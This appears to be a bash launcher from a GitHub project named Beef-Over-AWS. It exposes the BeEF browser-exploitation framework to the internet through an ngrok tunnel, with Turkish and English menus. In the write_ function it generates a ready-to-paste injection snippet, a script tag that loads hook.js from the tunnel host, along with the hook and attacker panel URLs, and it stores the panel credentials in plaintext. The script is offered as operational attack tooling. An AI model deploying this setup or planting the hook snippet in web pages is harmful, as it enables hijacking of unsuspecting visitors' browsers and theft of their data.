#!/bin/bash
url="http://localhost:4040/api/tunnels"
port_number_default=3000
FILE="links/username.txt"
FILE1="links/password.txt"
NON_FIRST_RUN_USERNAME="cat links/username.txt"
NON_FIRST_RUN_PASSWORD="cat links/password.txt"
function banner(){
	clear
	colors
	echo -e "${yellow}    ____            ____      ____                        ___ _       _______"
	echo -e "${yellow}   / __ )___  ___  / __/     / __ \_   _____  _____      /   | |     / / ___/"
	echo -e "${yellow}  / __  / _ \/ _ \/ /_______/ / / / | / / _ \/ ___/_____/ /| | | /| / /\__ \ "
	echo -e "${yellow} / /_/ /  __/  __/ __/_____/ /_/ /| |/ /  __/ /  /_____/ ___ | |/ |/ /___/ /" 
	echo -e "${yellow}/_____/\___/\___/_/        \____/ |___/\___/_/        /_/  |_|__/|__//____/"  
        echo -e "${purple}	 	       #>Author:Aziz Kaplan"                                                    
	echo -e "${purple}		       #>Github:AzizKpln"
	echo -e "${purple}		       #>Version:0.1\n\n"
}
function colors(){
	lightblue=`tput setaf 14` 
	green=`tput setaf 46`     
	RED=`tput setaf 196`      
	yellow=`tput setaf 11`    
	purple=`tput setaf 129`   
	reset=`tput sgr0`
}
function language(){
	colors
	banner
	echo -e "${red}[!]${purple}Choose A Language:\n"
	echo -e "1-Turkish"
	echo -e "2-English\n\n"
	read -p "${yellow}Beef-Over-AWS${green}#>" lang
	if [ $lang -ne 1 ] &&[ $lang -ne 2 ];then
		echo "${purple}[!]${red}Please enter a valid value!"
		exit
	fi
}
function username_password(){
	clear
	colors
	banner
	if [[ $lang -eq 2 ]];then
		clear
		banner
		if [ ! -f $FILE ] && [ ! -f $FILE1 ];then
			echo -e "${lightblue}[+]Looks like you're running this script for the first time.\n"
			echo -e "${lightblue}[+]You have to setup a username and password for the 'Beef' first.\n\n"
			echo -e "${green}[+]${lightblue}Input A Username For Beef-Xss:\n"
			read -p "${yellow}Beef-Over-AWS${green}#>" username
			echo -e "\n\n${green}[+]${lightblue} Input A Password For Beef-Xss:\n"
			read -p "${yellow}Beef-Over-AWS${green}#>" password
			if [[ $username == "" ]];then
				echo -e "${RED}Username Or Password Can't Be Empty!"
				exit
			fi
			if [[ $password == "" ]];then
				echo -e "${RED}Username Or Password Can't Be Empty!"
				exit
			fi
			echo $username > $FILE
			echo $password > $FILE1
		else
			username=$($NON_FIRST_RUN_USERNAME)
			password=$($NON_FIRST_RUN_PASSWORD)
		fi
	elif [[ $lang -eq 1 ]];then
		clear
		banner
		if [ ! -f $FILE ] && [ ! -f $FILE1 ];then
			echo -e "${lightblue}[+]Görünüşe Bakılırsa Dosyayı İlk Defa Çalıştırıyorsun.\n"
			echo -e "${lightblue}[+]'Beef' İçin Bir Parola ve Username Seçmen Gerekli.\n\n"
			echo -e "${green}[+]${lightblue}Beef-Xss İçin Bir Username Gir:\n"
			read -p "${yellow}Beef-Over-AWS${green}#>" username
			echo -e "\n\n${green}[+]${lightblue} Beef-Xss İçin Bir Parola Gir:\n"
			read -p "${yellow}Beef-Over-AWS${green}#>" password
			if [[ $username == "" ]];then
				echo -e "${RED}Username Veya Parola Boş Bırakılmaz!!"
				exit
			fi
			if [[ $password == "" ]];then
				echo -e "${RED}Username Veya Parola Boş Bırakılmaz!!"
				exit
			fi
			echo $username > $FILE
			echo $password > $FILE1
		else
			username=$($NON_FIRST_RUN_USERNAME)
			password=$($NON_FIRST_RUN_PASSWORD)
		fi
	fi
}
function write_(){
	username_password
	ngrok_url=$(wget -qO - $url | cut -d ":" -f 6 | cut -d "," -f 1 | tr -d '/"')
	echo "HTTP URL: http://$ngrok_url" > links/links.txt
	echo "HTTPS URL: https://$ngrok_url" >> links/links.txt
	echo "BEEF HOOK URL: http://$ngrok_url:80/hook.js" >> links/links.txt
	echo "BEEF PANEL URL: http://$ngrok_url/ui/panel" >> links/links.txt
	echo 'BEEF FAST JAVASCRIPT CODE: <script src="http://'$ngrok_url':80/hook.js"></script>' >> links/links.txt
	echo "BEEF USERNAME: $username" >> links/links.txt
	echo "BEEF PASSWORD: $password" >> links/links.txt
	
	if [[ $port_number == "" ]];then
		echo "BEEF PORT NO: $port_number_default" >> links/links.txt
	else
		echo "BEEF PORT NO: $port_number" >> links/links.txt
	fi
	echo -e "\n\n~Beef Over AWS~" >> links/links.txt
	echo -e "https://www.github.com/AzizKpln/Beef-Over-AWS" >> links/links.txt
	echo $ngrok_url > links/domain.txt
	echo $port_number > links/port_number.txt

	
	sleep 3
	rm beef/config.yaml
	./config/config.sh
		
}
function main(){
	colors
	language
	if [ $lang -eq 2 ];then
		clear
		banner
		echo -e "${purple}[!]${green} Enter The Port That You Want To Run Beef On [default:3000]:\n"
		read -p "${Yellow}Beef-Over-AWS${green}#>" port_number
		if [[ $port_number == "" ]];then
			echo "Port Number:$port_number_defaut"
			./ngrok/ngrok -log=stdout http $port_number_default > /dev/null &
		else
			echo "Port Number:$port_number"	
			./ngrok/ngrok -log=stdout http $port_number > /dev/null &
		fi
		sleep 5
		write_
		if [[ $port_number == "" ]];then
			cd beef/ && ./beef > /dev/null &
		else
			cd beef/ && ./beef -p  $port_number > /dev/null &
		fi
	elif [ $lang -eq 1 ];then
		clear
		banner
		echo -e "${purple}[!]${green} Beef'in Çalışacağı Port'u Giriniz: [varsayılan:3000]:\n"
		read -p "${Yellow}Beef-Over-AWS${green}#>" port_number
		if [[ $port_number == "" ]];then
			echo "Port Number:$port_number_defaut"
			./ngrok/ngrok http $port_number_default > /dev/null &
		else
			echo "Port Number:$port_number"	
			./ngrok/ngrok http $port_number > /dev/null &
		fi
		sleep 5
		write_
		if [[ $port_number == "" ]];then
			cd beef/ && ./beef > /dev/null &
		else
			cd beef/ && ./beef -p  $port_number > /dev/null &
		fi
		
	fi
	clear
	banner
	echo ${green}
	cat links/links.txt 
}

main

